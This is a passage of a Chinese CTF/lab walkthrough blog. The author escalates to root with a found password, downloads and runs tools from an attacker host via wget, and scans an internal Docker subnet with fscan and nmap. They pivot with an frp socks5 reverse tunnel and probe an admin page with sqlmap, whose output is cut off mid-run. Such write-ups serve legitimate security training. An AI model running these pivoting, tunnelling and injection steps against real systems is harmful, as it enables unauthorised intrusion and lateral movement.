<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@d45eb9e78ad8:/var/www/html$ <span class="token function">cat</span> flag.txt 
<span class="token function">cat</span> flag.txt

█   █▀▀ █ ▀█ █▀█ █▀▀ █▀▀
█▄▄ █▀  █ █▄ █▀▄ █▄▄ ██▄

Flag <span class="token number">3</span>: HELL<span class="token punctuation">&#123;</span>LF1_F1LT7R_CH41N_G3N3R4T0R<span class="token punctuation">&#125;</span></code></pre>
<p>搜索一番，but nothing，home下也没有其他用户，尝试切换root</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@d45eb9e78ad8:/var/www/html$ <span class="token function">su</span> root
<span class="token function">su</span> root
Password: webserver2023<span class="token operator">!</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>给个交互shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
root@d45eb9e78ad8:/var/www/html<span class="token comment"># </span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@d45eb9e78ad8:~<span class="token comment"># ls -al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwx------ <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Jul <span class="token number">17</span> 00:53 <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> root root    <span class="token number">5</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">3106</span> Oct <span class="token number">15</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">273</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> .wget-hsts
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">272</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
root@d45eb9e78ad8:~<span class="token comment"># cat flag.txt</span>
<span class="token function">cat</span> flag.txt

█▀█ █▀█ █▀█ ▀█▀   █▀█ █▀█   █▄ █ █▀█ ▀█▀   
█▀▄ █▄█ █▄█  █    █▄█ █▀▄   █ ▀█ █▄█  █   

Flag <span class="token number">4</span>: HELL<span class="token punctuation">&#123;</span>CR3D3NT14LS_1N_HTP455WD_3H?<span class="token punctuation">&#125;</span></code></pre>
<p>拿到flag4,root都没什么东西大概要横向了<br>传个ifconifg下网段</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@d45eb9e78ad8:~<span class="token comment"># wget http://192.168.56.104:6677/ifconfig                                                                                                </span>
<span class="token function">wget</span> http://192.168.56.104:6677/ifconfig                                                                                                                     
--2024-07-17 01:52:41--  http://192.168.56.104:6677/ifconfig
Connecting to <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">83976</span> <span class="token punctuation">(</span>82K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
Saving to: ‘ifconfig’

<span class="token function">ifconfig</span>            <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>  <span class="token number">82</span>.01K  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-07-17 01:52:41 <span class="token punctuation">(</span><span class="token number">187</span> MB/s<span class="token punctuation">)</span> - ‘ifconfig’ saved <span class="token punctuation">[</span><span class="token number">83976</span>/83976<span class="token punctuation">]</span>

root@d45eb9e78ad8:~<span class="token comment"># chmod +x ifconfig</span>
<span class="token function">chmod</span> +x <span class="token function">ifconfig</span>
root@d45eb9e78ad8:~<span class="token comment"># ./ifconfig</span>
./ifconfig
eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.17</span>.0.2  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.17</span>.255.255
        ether 02:42:ac:11:00:02  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">103384</span>  bytes <span class="token number">53031457</span> <span class="token punctuation">(</span><span class="token number">50.5</span> MiB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">102450</span>  bytes <span class="token number">77570246</span> <span class="token punctuation">(</span><span class="token number">73.9</span> MiB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">></span>  mtu <span class="token number">65536</span>
        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0
        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>
        RX packets <span class="token number">203</span>  bytes <span class="token number">15992</span> <span class="token punctuation">(</span><span class="token number">15.6</span> KiB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">203</span>  bytes <span class="token number">15992</span> <span class="token punctuation">(</span><span class="token number">15.6</span> KiB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></code></pre>
<p>网段是172.17.0.0&#x2F;16,传个fscan看一下存活主机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@d45eb9e78ad8:~<span class="token comment"># ./fscan -h 172.17.0.0/16</span>

   ___                              _    
  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ 
 / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
/ /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    
<span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>   
                     fscan version: <span class="token number">1.8</span>.4
start infoscan
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.17</span>.0.1      is alive
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.17</span>.0.2      is alive
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.17</span>.0.3      is alive
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> LiveTop <span class="token number">172.17</span>.0.0/16    段存活数量为: <span class="token number">3</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> LiveTop <span class="token number">172.17</span>.0.0/24    段存活数量为: <span class="token number">3</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">3</span>
<span class="token number">172.17</span>.0.1:21 <span class="token function">open</span>
<span class="token number">172.17</span>.0.3:80 <span class="token function">open</span>
<span class="token number">172.17</span>.0.2:80 <span class="token function">open</span>
<span class="token number">172.17</span>.0.1:80 <span class="token function">open</span>
<span class="token number">172.17</span>.0.3:22 <span class="token function">open</span>
<span class="token number">172.17</span>.0.1:22 <span class="token function">open</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">6</span>
start vulscan
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token function">ftp</span> <span class="token number">172.17</span>.0.1:21:anonymous 
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>flag.txt                                                                                                                                                                                                    
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.17.0.2         code:401 len:457    title:401 Unauthorized                                                                                                                                  
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.17.0.1         code:401 len:457    title:401 Unauthorized
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.17.0.3         code:200 len:761    title:<span class="token string">""</span></code></pre>
<p>还有3个存活主机，1应该是网关，那么目标因该是3.做个socks代理吧，方便操作</p>
<h2 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h2><p>用下frp吧</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">//kali
<span class="token operator">></span> <span class="token function">cat</span> frps.ini             
<span class="token punctuation">[</span>common<span class="token punctuation">]</span> 
bind_port <span class="token operator">=</span> <span class="token number">7000</span>
 ~/Desktop/frp                                                                                                                                                                                                                         root@kali2  09:32:01 
<span class="token operator">></span> ./frps <span class="token parameter variable">-c</span> frps.ini
WARNING: ini <span class="token function">format</span> is deprecated and the support will be removed <span class="token keyword">in</span> the future, please use yaml/json/toml <span class="token function">format</span> instead<span class="token operator">!</span>
<span class="token number">2024</span>-07-17 09:32:35.078 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>frps/root.go:105<span class="token punctuation">]</span> frps uses config file: frps.ini
<span class="token number">2024</span>-07-17 09:32:35.201 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>server/service.go:237<span class="token punctuation">]</span> frps tcp listen on <span class="token number">0.0</span>.0.0:7000                                                                                                                                                                          
<span class="token number">2024</span>-07-17 09:32:35.202 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>frps/root.go:114<span class="token punctuation">]</span> frps started successfully      </code></pre>


<pre class="language-bash" data-language="bash"><code class="language-bash">//machine
root@d45eb9e78ad8:~<span class="token comment"># cat frpc.ini</span>
<span class="token punctuation">[</span>common<span class="token punctuation">]</span>
server_addr <span class="token operator">=</span> <span class="token number">192.168</span>.56.104
server_port <span class="token operator">=</span> <span class="token number">7000</span>

<span class="token punctuation">[</span>socks5<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
plugin <span class="token operator">=</span> socks5
remote_port <span class="token operator">=</span> <span class="token number">10088</span>
root@d45eb9e78ad8:~<span class="token comment"># ./frpc -c frpc.ini</span>
WARNING: ini <span class="token function">format</span> is deprecated and the support will be removed <span class="token keyword">in</span> the future, please use yaml/json/toml <span class="token function">format</span> instead<span class="token operator">!</span>
<span class="token number">2024</span>-07-17 03:33:14.046 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>sub/root.go:142<span class="token punctuation">]</span> start frpc <span class="token function">service</span> <span class="token keyword">for</span> config <span class="token function">file</span> <span class="token punctuation">[</span>frpc.ini<span class="token punctuation">]</span>
<span class="token number">2024</span>-07-17 03:33:14.046 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>client/service.go:294<span class="token punctuation">]</span> try to connect to server<span class="token punctuation">..</span>.                                                                                                                                    
<span class="token number">2024</span>-07-17 03:33:14.049 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>client/service.go:286<span class="token punctuation">]</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span> login to server success, get run <span class="token function">id</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span>                                                                                      
<span class="token number">2024</span>-07-17 03:33:14.049 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>proxy/proxy_manager.go:173<span class="token punctuation">]</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span> proxy added: <span class="token punctuation">[</span>socks5<span class="token punctuation">]</span>                                                                                                                  
<span class="token number">2024</span>-07-17 03:33:14.050 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>client/control.go:168<span class="token punctuation">]</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span> <span class="token punctuation">[</span>socks5<span class="token punctuation">]</span> start proxy success   </code></pre>

<pre class="language-none"><code class="language-none">去kali配置一下代理
&#96;&#96;&#96;bash
&gt; cat &#x2F;etc&#x2F;proxychains.conf 
[ProxyList]
socks5 127.0.0.1 10088</code></pre>
<p>扫一下172.17.0.3的端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> proxychains nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-T4</span> <span class="token number">172.17</span>.0.3
Nmap scan report <span class="token keyword">for</span> <span class="token number">172.17</span>.0.3
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0029s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.78</span> seconds</code></pre>
<p>开放了22 80两个端口</p>
<h2 id="web探测2"><a href="#web探测2" class="headerlink" title="web探测2"></a>web探测2</h2><p>浏览器也得挂下代理<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkLBg.png" alt="ORkLBg.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/07/17/ORkEZB.png" alt="ORkEZB.png" loading="lazy"><br>没什么功能点，扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://172.17.0.3/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">--proxy</span> socks5://127.0.0.1:1080

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://172.17.0.3/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Proxy:                   socks5://127.0.0.1:1080
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">275</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">275</span><span class="token punctuation">]</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">761</span><span class="token punctuation">]</span>
Progress: <span class="token number">1033</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">0.08</span>%<span class="token punctuation">)</span><span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> Get <span class="token string">"http://172.17.0.3/careers"</span><span class="token builtin class-name">:</span> context deadline exceeded <span class="token punctuation">(</span>Client.Timeout exceeded <span class="token keyword">while</span> awaiting headers<span class="token punctuation">)</span>
/admin                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">308</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://172.17.0.3/admin/<span class="token punctuation">]</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png" alt="ORkSMK.png" loading="lazy"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://172.17.0.3/admin/index.php?id=1"</span> <span class="token parameter variable">--proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:10088"</span> <span class="token parameter variable">--batch</span>

        ___
       __H__                                                                                                                                                                                                                                                                                                               
 ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                                                                                                   </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token string">']     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>                                                                                                                                                                                                                                                                                                  
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>.<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>                                                                                                                                                                                                                                                                                                  
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org                                                                                                                                                                                                                                                                               

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:35:12 /2024-07-17/

[09:35:12] [INFO] testing connection to the target URL
[09:35:12] [INFO] testing if the target URL content is stable
[09:35:13] [INFO] target URL content is stable
[09:35:13] [INFO] testing if GET parameter '</span><span class="token function">id</span><span class="token string">' is dynamic
[09:35:13] [WARNING] GET parameter '</span><span class="token function">id</span><span class="token string">' does not appear to be dynamic
[09:35:13] [WARNING] heuristic (basic) test shows that GET parameter '</span><span class="token function">id</span><span class="token string">' might not be injectable
[09:35:13] [INFO] testing for SQL injection on GET parameter '</span><span class="token function">id</span><span class="token string">'
[09:35:13] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause<span class="token string">'
[09:35:13] [INFO] GET parameter '</span><span class="token function">id</span><span class="token string">' appears to be '</span>AND boolean-based blind - WHERE or HAVING clause<span class="token string">' injectable (with --string="Query was successfully")
[09:35:13] [INFO] heuristic (extended) test shows that the back-end DBMS could be '</span>MySQL<span class="token string">' 
it looks like the back-end DBMS is '</span>MySQL<span class="token string">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for '</span>MySQL<span class="token string">' extending provided level (1) and risk (1) values? [Y/n] Y
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.6</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.6</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.7</span>.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.7</span>.8 OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">4.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">4.1</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> error-based - PROCEDURE ANALYSE <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> error-based - Parameter replace <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> error-based - Parameter replace <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.6</span> error-based - Parameter replace <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.7</span>.8 error-based - Parameter replace <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span> error-based - Parameter replace <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> error-based - Parameter replace <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> error-based - Parameter replace <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>Generic inline queries<span class="token string">'
